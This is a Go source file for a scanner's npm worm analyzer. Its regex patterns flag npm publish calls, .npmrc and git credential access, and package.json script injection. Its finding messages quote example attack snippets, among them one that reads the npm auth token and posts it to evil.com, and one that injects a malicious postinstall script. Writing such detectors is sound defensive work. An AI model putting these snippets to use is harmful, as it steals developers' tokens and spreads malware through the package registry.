package analyzer

import (
	"fmt"
	"regexp"
	"strings"
)

// WormAnalyzer detects self-replicating worm patterns that spread through
// the npm ecosystem by stealing credentials and publishing infected packages.
// Based on research on the Shai-Hulud worm concept and real-world npm worms.
type WormAnalyzer struct{}

func NewWormAnalyzer() *WormAnalyzer {
	return &WormAnalyzer{}
}

func (a *WormAnalyzer) Name() string {
	return "worm"
}

var (
	// npm publish command execution
	npmPublishPattern = regexp.MustCompile(`(?i)npm\s+publish|npm\.commands\.publish`)

	// .npmrc file access (contains auth tokens)
	npmrcAccessPattern = regexp.MustCompile(`(?i)\.npmrc|_authToken|npm_token|NPM_TOKEN`)

	// Git credential access
	gitCredentialPattern = regexp.MustCompile(`(?i)\.git-credentials|git\s+config.*credential|\.gitconfig|GIT_TOKEN|GITHUB_TOKEN`)

	// package.json modification patterns
	pkgJsonModifyPattern = regexp.MustCompile(`(?i)(?:writeFile|writeFileSync)\s*\(\s*['"]?package\.json|JSON\.stringify\s*\(\s*pkg`)

	// Script injection into package.json
	scriptInjectionPattern = regexp.MustCompile(`(?i)(?:scripts|postinstall|preinstall|install)\s*['"]\s*[:\]]\s*['"]`)
)

func (a *WormAnalyzer) scanContent(content string, filename string) []Finding {
	var findings []Finding

	hasNpmPublish := npmPublishPattern.MatchString(content)
	hasNpmrcAccess := npmrcAccessPattern.MatchString(content)
	hasGitCreds := gitCredentialPattern.MatchString(content)
	hasPkgJsonMod := pkgJsonModifyPattern.MatchString(content)
	hasExfil := strings.Contains(content, "fetch(") ||
		strings.Contains(content, "sendBeacon") ||
		strings.Contains(content, "https.request") ||
		strings.Contains(content, "http.request")

	// npm publish - self-replication
	if hasNpmPublish {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Worm behavior: npm publish command detected",
			Description: fmt.Sprintf("File %q executes 'npm publish'. A package that publishes other packages is a strong indicator of worm behavior that propagates through the npm registry.", filename),
			Severity:    SeverityCritical,
			ExploitExample: "Worm replication:\n" +
				"    // Modify package and republish\n" +
				"    pkg.version = '9.9.9';\n" +
				"    execSync('npm publish');\n" +
				"    The worm infects and republishes packages the developer has access to.",
			Remediation: "This is self-replicating malware. Remove immediately and revoke all npm tokens.",
		})
	}

	// .npmrc token theft
	if hasNpmrcAccess && (hasExfil || hasNpmPublish) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "npm token theft from .npmrc",
			Description: fmt.Sprintf("File %q accesses .npmrc or auth tokens and may exfiltrate them. Stolen tokens enable publishing malicious packages under the victim's identity.", filename),
			Severity:    SeverityCritical,
			ExploitExample: "Token theft:\n" +
				"    const npmrc = fs.readFileSync('~/.npmrc');\n" +
				"    const token = npmrc.match(/_authToken=(.+)/)[1];\n" +
				"    fetch('https://evil.com', {body: token});\n" +
				"    Attacker can now publish as the victim.",
			Remediation: "Revoke all npm tokens immediately. Enable 2FA on npm account. Check for unauthorized publishes.",
		})
	}

	// Git credential theft
	if hasGitCreds && (hasExfil || strings.Contains(content, "exec")) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Git credential theft detected",
			Description: fmt.Sprintf("File %q accesses git credentials or tokens. These can be used to inject malicious code into source repositories.", filename),
			Severity:    SeverityCritical,
			ExploitExample: "Git credential theft:\n" +
				"    const creds = fs.readFileSync('~/.git-credentials');\n" +
				"    // Or via environment:\n" +
				"    const token = process.env.GITHUB_TOKEN;\n" +
				"    // Attacker commits backdoors to victim's repos",
			Remediation: "Rotate all git tokens and SSH keys. Check recent commits for unauthorized changes.",
		})
	}

	// package.json modification for injection
	if hasPkgJsonMod {
		severity := SeverityHigh
		desc := "modifies package.json"
		if strings.Contains(content, "postinstall") || strings.Contains(content, "preinstall") {
			severity = SeverityCritical
			desc = "injects lifecycle scripts into package.json for worm propagation"
		}
		if strings.Contains(content, "dependencies") {
			severity = SeverityCritical
			desc = "modifies package.json dependencies for supply chain injection"
		}
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Worm propagation: package.json modification",
			Description: fmt.Sprintf("File %q %s. This is a worm propagation technique that infects downstream projects.", filename, desc),
			Severity:    severity,
			ExploitExample: "Supply chain injection:\n" +
				"    pkg.scripts.postinstall = 'node malware.js';\n" +
				"    pkg.dependencies['evil-pkg'] = '*';\n" +
				"    fs.writeFileSync('package.json', JSON.stringify(pkg));\n" +
				"    Every npm install now runs the malware.",
			Remediation: "Review package.json for unauthorized modifications. Check git diff for unexpected changes.",
		})
	}

	return findings
}
